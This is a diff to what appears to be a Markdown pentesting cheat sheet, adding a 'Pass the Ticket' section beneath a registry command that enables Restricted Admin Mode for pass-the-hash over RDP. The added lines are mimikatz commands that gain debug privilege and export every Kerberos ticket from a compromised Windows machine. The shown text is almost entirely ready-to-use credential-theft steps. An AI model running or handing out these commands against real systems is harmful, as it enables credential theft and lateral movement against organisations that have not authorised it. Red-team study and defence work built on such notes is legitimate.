@@ -460,3 +460,11 @@ c:\tools> reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v Disa
 ```
 %% Enable Restricted Admin Mode to allow PtH on rdp %%
 
+
+### Pass the Ticket (PtT) from Windows
+```
+c:\tools> mimikatz.exe
+mimikatz # privilege::debug
+mimikatz # sekurlsa::tickets /export
+```
+%% export all kerberos tickets if you get access to a local machine, you have to be local administrator %%
